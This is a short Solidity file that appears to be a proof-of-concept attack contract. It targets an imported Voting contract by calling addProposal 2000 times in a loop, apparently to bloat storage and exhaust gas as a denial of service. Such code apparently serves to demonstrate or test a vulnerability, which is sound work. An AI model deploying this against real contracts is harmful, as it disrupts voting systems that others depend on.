// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Voting.sol";

contract AttackVoting {
    Voting public voting;

    constructor(address _votingAddress) {
        voting = Voting(_votingAddress);
    }

    function attackVoting() external {
        for(uint i = 0; i < 2000; i++) {
            voting.addProposal("hello");
        }
    }
}